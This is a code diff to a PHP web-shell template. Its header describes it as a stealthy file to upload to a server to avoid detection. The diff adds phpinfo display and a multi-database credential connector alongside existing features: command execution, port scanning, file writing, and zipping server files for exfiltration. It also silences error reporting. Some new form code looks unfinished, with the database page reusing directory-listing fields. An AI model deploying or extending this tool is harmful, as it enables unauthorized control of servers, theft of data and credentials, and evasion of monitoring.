@@ -4,7 +4,7 @@
  * Build: 2024-04-13
  * Last change: 2024-04-13
  * Author: @Ebalo <https://github.com/ebalo55>
- * Minimum PHP version: 5.3
+ * Minimum PHP version: 5.5
  * Description:
  * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
  * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
@@ -12,21 +12,24 @@
  * monitoring system without rising any uncommon process tree nor disk operation.
  * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
  */
+error_reporting(0);
 session_start();
 
 // Features name constants
-$LOGIN = "__FEAT_LOGIN__";
-$FILE_EXTRACTION = "__FEAT_FILE_EXTRACTION__";
+$LOGIN                   = "__FEAT_LOGIN__";
+$FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
 $FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
-$DIRECTORY_LISTING = "__FEAT_DIRECTORY_LISTING__";
-$EXFILTRATE = "__FEAT_EXFILTRATE__";
-$PORT_SCAN = "__FEAT_PORT_SCAN__";
-$WRITE_FILE = "__FEAT_WRITE_FILE__";
-$RUN_COMMAND = "__FEAT_RUN_COMMAND__";
+$DIRECTORY_LISTING       = "__FEAT_DIRECTORY_LISTING__";
+$EXFILTRATE              = "__FEAT_EXFILTRATE__";
+$PORT_SCAN               = "__FEAT_PORT_SCAN__";
+$WRITE_FILE              = "__FEAT_WRITE_FILE__";
+$RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
+$PHP_INFO                = "__FEAT_PHP_INFO__";
+$QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
-$SALT = "__SALT__";
+$SALT     = "__SALT__";
 
 /**
  * Define the enabled features
@@ -82,6 +85,20 @@ $ENABLED_FEATURES = array(
         "description" => "Run a system command using the default shell.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
+</svg>',
+    ),
+    $PHP_INFO                => array(
+        "title"       => "PHP Info",
+        "description" => "Display PHP information.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
+</svg>',
+    ),
+    $QUERY_DATABASES         => array(
+        "title"       => "Query databases",
+        "description" => "Query databases using the provided credentials.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
 </svg>',
     ),
 );
@@ -274,6 +291,45 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     return ob_get_clean();
 }
 
+function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
+    ob_start();
+    ?>
+    <div>
+        <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-gray-900">
+            <?php echo $label ?>
+            <?php
+            if ($required) {
+                echo "<sup class='text-red-500'>*</sup>";
+            }
+            ?>
+        </label>
+        <select id="<?php echo $name ?>" name="<?php echo $name ?>"
+                class="mt-2 block w-full rounded-md border-0 py-1.5 pl-3 pr-10 text-gray-900 ring-1 ring-inset
+                ring-gray-300 focus:ring-2 focus:ring-indigo-600 sm:text-sm sm:leading-6"
+            <?php
+            if ($required) {
+                echo "required ";
+            }
+            ?>
+        >
+            <?php
+            foreach ($options as $option) {
+                echo "<option value='" .
+                     $option["value"] .
+                     "' " .
+                     ($option["disabled"] ? "disabled" : "") .
+                     ">" .
+                     $option["label"] .
+                     ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
+                     "</option>";
+            }
+            ?>
+        </select>
+    </div>
+    <?php
+    return ob_get_clean();
+}
+
 /**
  * Create a checkbox field
  *
@@ -368,6 +424,7 @@ function makePage($elements, $current_page) {
     <head>
         <title>__TITLE__</title>
         <style><?php echo $CSS ?></style>
+        <link rel="stylesheet" href="compiled.css">
         <script>__JS__</script>
     </head>
     <body class="bg-white">
@@ -419,6 +476,7 @@ function makeLoginPage() {
     <head>
         <title>__TITLE__</title>
         <style><?php echo $CSS ?></style>
+        <link rel="stylesheet" href="compiled.css">
         <script>__JS__</script>
     </head>
     <body class="h-full">
@@ -529,18 +587,23 @@ function makeAlert($title, $message) {
 /**
  * Open the command output screen where output can be freely written
  *
+ * @param string $title Title of the command output screen
+ *
  * @return void
  */
-function openCommandOutputScreen()
+function openCommandOutputScreen($classes = "", $title = "Command output", $no_margin = false, $no_padding = false)
 {
     ?>
-<div class="ml-72 py-10">
+<div class="<?php
+echo $no_margin ? "" : "ml-72 ";
+echo $no_padding ? "" : "py-10 ";
+?>">
     <div class="container px-16">
-    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-2">
-    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-7">
-        Command output
+    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
+    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
+        <?php echo $title ?>
     </h3>
-    <pre class="p-2"><?php
+    <pre class="p-2 mt-2 <?php echo $classes ?>"><?php
 }
 
 /**
@@ -577,17 +640,21 @@ function out($data) {
 
 /**
  * Download a file in chunks
+ *
  * @param $filepath string Path to the file to download
  * @param $filesize int Size of the file
+ * @param $filename string Name of the file to download or null to use the original filename
  *
  * @return void
  */
-function chunkedDownload($filepath, $filesize) {
+function chunkedDownload($filepath, $filesize, $filename = null) {
     $chunk_size = 4096; // Adjust chunk size as needed
 
     header('Content-Description: File Transfer');
     header('Content-Type: application/octet-stream'); // Adjust content type if needed
-    header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
+    header(
+        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"'
+    );
     header('Content-Transfer-Encoding: chunked');
     header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
 
@@ -698,6 +765,7 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
 
 /**
  * Get the stat for the current path and print information
+ *
  * @param $path string Path to get stat for
  *
  * @return array
@@ -856,11 +924,22 @@ function getShortestCommonPath($paths) {
 function handleCreateZip() {
     $content = $_POST['__PARAM_1__'];
 
+    if (!extension_loaded('zip')) {
+        echo makeExfiltratePage();
+        openCommandOutputScreen();
+        echo "Error: Zip extension is not loaded.";
+        closeCommandOutputScreen();
+        return;
+    }
+
     $zip      = new ZipArchive();
     $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
 
     if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
+        echo makeExfiltratePage();
+        openCommandOutputScreen();
         echo "Error: Could not create temporary archive.";
+        closeCommandOutputScreen();
         return;
     }
 
@@ -908,8 +987,8 @@ function handleCreateZip() {
 
     $zip->close();
 
-    $file_size  = filesize($zip_name);
-    chunkedDownload($zip_name, $file_size);
+    $file_size = filesize($zip_name);
+    chunkedDownload($zip_name, $file_size, "export.zip");
     unlink($zip_name); // Delete temporary zip file;
 }
 
@@ -1013,6 +1092,7 @@ function handleWriteFile() {
 
 /**
  * Handle the login operation
+ *
  * @return void
  */
 function handleLogin() {
@@ -1023,6 +1103,130 @@ function handleLogin() {
     if ($username === $USERNAME && $password === $PASSWORD) {
         $_SESSION["auth"] = true;
         header("Location: ?page=" . $FILE_EXTRACTION, true, 301);
+    }
+}
+
+/**
+ * Render the page for the exfiltration operation
+ *
+ * @return string
+ */
+function makeExfiltratePage() {
+    global $EXFILTRATE, $ENABLED_FEATURES;
+    return makePage(
+        array(
+            makePageHeader(
+                $ENABLED_FEATURES[$EXFILTRATE]["title"],
+                $ENABLED_FEATURES[$EXFILTRATE]["description"]
+            ),
+            makeForm(
+                $EXFILTRATE,
+                $_SERVER["REQUEST_URI"],
+                array(
+                    makeInput(
+                        "textarea",
+                        "Paths",
+                        "__PARAM_1__",
+                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
+                        "List of file/folders to include in the zip archive.<br/>" .
+                        "Concatenate to the path " . makeCodeHighlight(",with_tree") .
+                        " to include all files and folders within a given directory.<br/>" .
+                        "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
+                        " to include only files with the given extensions.",
+                        true
+                    ),
+                )
+            ),
+        ),
+        $EXFILTRATE
+    );
+}
+
+/**
+ * List all enabled extensions
+ *
+ * @return string
+ */
+function listEnabledExtensions() {
+    $extensions = get_loaded_extensions();
+    ob_start();
+    openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
+    foreach ($extensions as $extension) {
+        echo "- $extension\n";
+    }
+    closeCommandOutputScreen();
+    return ob_get_clean();
+}
+
+/**
+ * Connect to a database using the given credentials
+ *
+ * @param $db_type string Database type
+ * @param $username string Username
+ * @param $password string Password
+ * @param $host string Host
+ * @param $port int Port
+ *
+ * @return PDO|null
+ */
+function connectToDatabase($db_type, $username, $password, $host = 'localhost', $port = null) {
+    if ($db_type === 'mysql') {
+        $port = $port ?: 3306; // Default MySQL port
+        $dsn  = "mysql:host=$host;port=$port";
+    }
+    elseif ($db_type === 'cubrid') {
+        $port = $port ?: 33000; // Default CUBRID port
+        $dsn  = "cubrid:host=$host;port=$port";
+    }
+    elseif ($db_type === 'pgsql') {
+        $port = $port ?: 5432; // Default PostgreSQL port
+        $dsn  = "pgsql:host=$host;port=$port";
+    }
+    elseif ($db_type === 'sqlite') {
+        $dsn = "sqlite:$host";
+    }
+    elseif ($db_type === 'sqlsrv') {
+        $port = $port ?: 1433; // Default SQL Server port
+        $dsn  = "sqlsrv:Server=$host,$port";
+    }
+    elseif ($db_type === 'oci') {
+        $dsn = "oci:dbname=//$host";
+    }
+    elseif ($db_type === 'mongodb') {
+        $port = $port ?: 27017; // Default MongoDB port
+        $dsn  = "mongodb://$host:$port";
+    }
+    elseif ($db_type === 'ibm') {
+        $port = $port ?: 50000; // Default IBM DB2 port
+        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$host;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;";
+    }
+    elseif ($db_type === 'firebird') {
+        $port = $port ?: 3050; // Default Firebird/Interbase port
+        $dsn  = "firebird:host=$host;dbname=$host/port:$port";
+    }
+    elseif ($db_type === 'odbc') {
+        $dsn = "odbc:Driver={Microsoft Access Driver (*.mdb)};Dbq=$host";
+    }
+    elseif ($db_type === 'informix') {
+        $dsn = "informix:host=$host;service=$port";
+    }
+    elseif ($db_type === 'sybase') {
+        $port = $port ?: 5000; // Default Sybase port
+        $dsn  = "sybase:host=$host;port=$port";
+    }
+    else {
+        echo "Unsupported database type: $db_type";
+        return null;
+    }
+
+    try {
+        $pdo = new PDO($dsn, $username, $password);
+        echo "Connected to $db_type as $username.";
+        return $pdo;
+    }
+    catch (PDOException $e) {
+        echo "Connection failed: " . $e->getMessage();
+        return null;
     }
 }
 
@@ -1134,33 +1338,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $EXFILTRATE:
-            $content = makePage(
-                array(
-                    makePageHeader(
-                        $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
-                    ),
-                    makeForm(
-                        $page,
-                        $_SERVER["REQUEST_URI"],
-                        array(
-                            makeInput(
-                                "textarea",
-                                "Paths",
-                                "__PARAM_1__",
-                                "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
-                                "List of file/folders to include in the zip archive.<br/>" .
-                                "Concatenate to the path " . makeCodeHighlight(",with_tree") .
-                                " to include all files and folders within a given directory.<br/>" .
-                                "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
-                                " to include only files with the given extensions.",
-                                true
-                            ),
-                        )
-                    ),
-                ),
-                $page
-            );
+            $content = makeExfiltratePage();
             break;
         case $PORT_SCAN:
             $content = makePage(
@@ -1275,11 +1453,153 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
+        case $PHP_INFO:
+            ob_start();
+            phpinfo();
+            $php_info = ob_get_clean();
+            $content  = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    "<div class='grid grid-cols-2 gap-8 mt-8'>
+                        <div>
+                            <div id='phpinfo-container' class='max-w-full overflow-x-auto'></div>
+                            <script>
+                                const container = document.getElementById('phpinfo-container');
+                                const shadow_root = container.attachShadow({mode: 'open'});
+                                shadow_root.innerHTML = `$php_info`;
+                            </script>
+                        </div>
+                        <div>
+                            " . listEnabledExtensions() . "
+                        </div>
+                    </div>",
+                ),
+                $page
+            );
+            break;
+        case $QUERY_DATABASES:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeSelect(
+                                "Database",
+                                "__PARAM_1__",
+                                array(
+                                    [
+                                        "value"    => "mysql",
+                                        "label"    => "MySQL",
+                                        "disabled" => !extension_loaded("mysql") &&
+                                                      !extension_loaded("mysqli") &&
+                                                      !extension_loaded("pdo_mysql") &&
+                                                      !extension_loaded("mysqlnd"),
+                                    ],
+                                    [
+                                        "value"    => "cubrid",
+                                        "label"    => "CUBRID",
+                                        "disabled" => !extension_loaded("cubrid") && !extension_loaded("pdo_cubrid"),
+                                    ],
+                                    [
+                                        "value"    => "pgsql",
+                                        "label"    => "PostgreSQL",
+                                        "disabled" => !extension_loaded("pgsql") && !extension_loaded("pdo_pgsql"),
+                                    ],
+                                    [
+                                        "value"    => "sqlite",
+                                        "label"    => "SQLite",
+                                        "disabled" => !extension_loaded("sqlite3") && !extension_loaded("pdo_sqlite"),
+                                    ],
+                                    [
+                                        "value"    => "sqlsrv",
+                                        "label"    => "SQL Server",
+                                        "disabled" => !extension_loaded("sqlsrv") && !extension_loaded("pdo_sqlsrv"),
+                                    ],
+                                    [
+                                        "value"    => "oci",
+                                        "label"    => "Oracle",
+                                        "disabled" => !extension_loaded("oci8") && !extension_loaded("pdo_oci"),
+                                    ],
+                                    [
+                                        "value"    => "mongodb",
+                                        "label"    => "MongoDB",
+                                        "disabled" => !extension_loaded("mongodb") && !extension_loaded("mongodb"),
+                                    ],
+                                    [
+                                        "value"    => "ibm",
+                                        "label"    => "IBM DB2",
+                                        "disabled" => !extension_loaded("ibm_db2") && !extension_loaded("pdo_ibm"),
+                                    ],
+                                    [
+                                        "value"    => "firebird",
+                                        "label"    => "Firebird/Interbase",
+                                        "disabled" => !extension_loaded("interbase") &&
+                                                      !extension_loaded("pdo_firebird"),
+                                    ],
+                                    [
+                                        "value"    => "odbc",
+                                        "label"    => "ODBC",
+                                        "disabled" => !extension_loaded("odbc") && !extension_loaded("pdo_odbc"),
+                                    ],
+                                    [
+                                        "value"    => "informix",
+                                        "label"    => "Informix",
+                                        "disabled" => !extension_loaded("informix") &&
+                                                      !extension_loaded("pdo_informix"),
+                                    ],
+                                    [
+                                        "value"    => "sybase",
+                                        "label"    => "Sybase",
+                                        "disabled" => !extension_loaded("sybase") &&
+                                                      !extension_loaded("sybase_ct") &&
+                                                      !extension_loaded("pdo_dblib"),
+                                    ],
+                                    [
+                                        "value"    => "raw",
+                                        "label"    => "Raw connection",
+                                        "disabled" => !extension_loaded("pdo"),
+                                    ],
+                                ),
+                                true,
+                                "Database driver not available."
+                            ),
+                            makeInput(
+                                "text",
+                                "Path",
+                                "__PARAM_1__",
+                                "C://path/to/directory or \\\\network\\path\\to\\directory",
+                                "Fully qualified path to the directory to list.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "Depth",
+                                "__PARAM_2__",
+                                "5",
+                                "How many levels deep to list, where " . makeCodeHighlight(0) .
+                                " is the current directory and " . makeCodeHighlight("inf") .
+                                " means to list all.",
+                                true
+                            ),
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
     }
 
     echo $content;
 
-    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== $LOGIN) {
+    if (isPost() && !in_array($_POST["__OPERATION__"], $isolated_ops)) {
         openCommandOutputScreen();
     }
 }
